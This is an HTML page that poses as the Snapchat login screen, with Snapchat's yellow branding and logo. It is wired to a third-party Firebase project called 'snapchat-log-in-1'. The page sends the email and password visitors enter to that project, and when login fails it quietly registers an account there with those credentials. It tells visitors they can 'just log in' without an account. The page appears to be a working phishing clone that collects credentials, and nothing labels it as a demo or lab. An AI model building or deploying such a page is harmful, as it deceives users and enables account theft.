<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Snapchat – Log In</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
  <style>
    body { font-family: 'Helvetica Neue', Arial, sans-serif; }
    .input-field {
      width: 100%; padding: 14px 16px;
      border: 2px solid #e5e7eb; border-radius: 14px;
      font-size: 15px; background: #f9fafb;
      outline: none; transition: all 0.2s; color: #111;
    }
    .input-field:focus {
      border-color: #E6E300; background: #fffff5;
      box-shadow: 0 0 0 4px rgba(255,252,0,0.2);
    }
    .input-field.error { border-color: #ff3b30; background: #fff5f5; }
    .btn-login {
      width: 100%; padding: 15px;
      background: #FFFC00; color: #000;
      font-weight: 800; font-size: 16px;
      border: none; border-radius: 50px;
      cursor: pointer; transition: all 0.2s;
    }
    .btn-login:hover { background: #E6E300; transform: translateY(-1px); box-shadow: 0 8px 20px rgba(255,252,0,0.5); }
    .btn-login:active { transform: translateY(0); box-shadow: none; }
    .btn-login.loading { pointer-events: none; opacity: 0.8; }
    .btn-login.loading .btn-text { display: none; }
    .btn-login.loading .spinner { display: block; }
    .spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.15); border-top-color: #000; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .success-overlay { display: none; position: absolute; inset: 0; background: white; border-radius: 24px; flex-direction: column; align-items: center; justify-content: center; gap: 12px; z-index: 20; }
    .success-overlay.show { display: flex; }
  </style>
</head>
<body style="background:#FFFC00;" class="min-h-screen flex items-center justify-center">

  <div class="bg-white rounded-3xl w-full max-w-sm mx-4 px-9 pt-10 pb-9 relative"
       style="box-shadow: 0 24px 80px rgba(0,0,0,0.13);">

    <div class="success-overlay" id="successOverlay">
      <img src="https://i.ibb.co/VjZzNm3/images-removebg-preview.png" alt="Snapchat" width="80" height="80" style="object-fit:contain;"/>
      <p class="text-xl font-extrabold text-black" id="successMsg"></p>
      <p class="text-sm text-gray-500" id="successName"></p>
    </div>

    <div class="flex flex-col items-center mb-8">
      <img src="https://i.ibb.co/VjZzNm3/images-removebg-preview.png" alt="Snapchat Logo" width="80" height="80" style="object-fit:contain;"/>
      <h1 class="text-2xl font-extrabold tracking-tight text-black mt-2">Snapchat</h1>
    </div>

    <form id="loginForm" novalidate>
      <div class="mb-4">
        <label class="block text-xs font-semibold text-gray-400 uppercase tracking-widest mb-2">Email</label>
        <input id="username" type="email" placeholder="example@email.com" class="input-field"/>
        <p id="userError" class="hidden text-red-500 text-xs mt-1.5 font-medium">Please enter your email.</p>
      </div>
      <div class="mb-3">
        <label class="block text-xs font-semibold text-gray-400 uppercase tracking-widest mb-2">Password</label>
        <div class="relative">
          <input id="password" type="password" placeholder="••••••••" class="input-field" style="padding-right:48px;"/>
          <button type="button" id="togglePw" class="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-700">
            <svg id="eyeOpen" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
            </svg>
            <svg id="eyeClosed" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden">
              <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
              <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
              <line x1="1" y1="1" x2="23" y2="23"/>
            </svg>
          </button>
        </div>
        <p id="pwError" class="hidden text-red-500 text-xs mt-1.5 font-medium">Please enter your password.</p>
      </div>
      <p id="firebaseError" class="hidden text-red-500 text-xs mt-1 mb-3 font-medium text-center"></p>
      <div class="text-right mb-5">
        <a href="#" class="text-gray-400 text-xs font-medium hover:text-black">Forgot password?</a>
      </div>
      <button type="submit" id="loginBtn" class="btn-login">
        <span class="btn-text">Log In</span>
        <div class="spinner"></div>
      </button>
    </form>

    <div class="flex items-center gap-3 my-5 text-xs text-gray-300">
      <div class="flex-1 h-px bg-gray-200"></div>OR<div class="flex-1 h-px bg-gray-200"></div>
    </div>
    <p class="text-center text-sm text-gray-400">
      Don't have an account? <span class="text-black font-bold">Just log in!</span>
    </p>
  </div>

  <script>
    firebase.initializeApp({
      apiKey: "AIzaSyCGOXNi2xPOQHYK3QzBTPxJhLJYWwPQPVg",
      authDomain: "snapchat-log-in-1.firebaseapp.com",
      projectId: "snapchat-log-in-1",
      storageBucket: "snapchat-log-in-1.firebasestorage.app",
      messagingSenderId: "649166599151",
      appId: "1:649166599151:web:ce99879c7ace4e24b5bc1a"
    });

    const auth = firebase.auth();
    const form = document.getElementById('loginForm');
    const emailInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const userError = document.getElementById('userError');
    const pwError = document.getElementById('pwError');
    const loginBtn = document.getElementById('loginBtn');
    const togglePw = document.getElementById('togglePw');
    const eyeOpen = document.getElementById('eyeOpen');
    const eyeClosed = document.getElementById('eyeClosed');
    const successOverlay = document.getElementById('successOverlay');
    const successName = document.getElementById('successName');
    const successMsg = document.getElementById('successMsg');
    const firebaseError = document.getElementById('firebaseError');

    togglePw.addEventListener('click', () => {
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      eyeOpen.classList.toggle('hidden', isPassword);
      eyeClosed.classList.toggle('hidden', !isPassword);
    });

    emailInput.addEventListener('input', () => {
      emailInput.classList.remove('error');
      userError.classList.add('hidden');
      firebaseError.classList.add('hidden');
    });

    passwordInput.addEventListener('input', () => {
      passwordInput.classList.remove('error');
      pwError.classList.add('hidden');
      firebaseError.classList.add('hidden');
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      let valid = true;
      firebaseError.classList.add('hidden');

      if (!emailInput.value.trim()) {
        emailInput.classList.add('error');
        userError.classList.remove('hidden');
        valid = false;
      }
      if (!passwordInput.value) {
        passwordInput.classList.add('error');
        pwError.classList.remove('hidden');
        valid = false;
      }
      if (!valid) return;

      loginBtn.classList.add('loading');

      try {
        const userCredential = await auth.signInWithEmailAndPassword(emailInput.value.trim(), passwordInput.value);
        successName.textContent = userCredential.user.email;
        successMsg.textContent = 'Welcome back! 👋';
        loginBtn.classList.remove('loading');
        successOverlay.classList.add('show');
      } catch (loginError) {
        if (loginError.code === 'auth/user-not-found' || loginError.code === 'auth/invalid-credential') {
          try {
            const newUser = await auth.createUserWithEmailAndPassword(emailInput.value.trim(), passwordInput.value);
            successName.textContent = newUser.user.email;
            successMsg.textContent = 'Account created! Welcome! 🎉';
            loginBtn.classList.remove('loading');
            successOverlay.classList.add('show');
          } catch (signupError) {
            loginBtn.classList.remove('loading');
            let msg = 'Something went wrong.';
            if (signupError.code === 'auth/weak-password') msg = 'Password must be at least 6 characters.';
            else if (signupError.code === 'auth/invalid-email') msg = 'Please enter a valid email.';
            firebaseError.textContent = msg;
            firebaseError.classList.remove('hidden');
          }
        } else if (loginError.code === 'auth/wrong-password') {
          loginBtn.classList.remove('loading');
          firebaseError.textContent = 'Incorrect password. Please try again.';
          firebaseError.classList.remove('hidden');
        } else if (loginError.code === 'auth/too-many-requests') {
          loginBtn.classList.remove('loading');
          firebaseError.textContent = 'Too many attempts. Please try later.';
          firebaseError.classList.remove('hidden');
        } else {
          loginBtn.classList.remove('loading');
          firebaseError.textContent = loginError.code + ': ' + loginError.message;
          firebaseError.classList.remove('hidden');
        }
      }
    });
  </script>
</body>
</html>
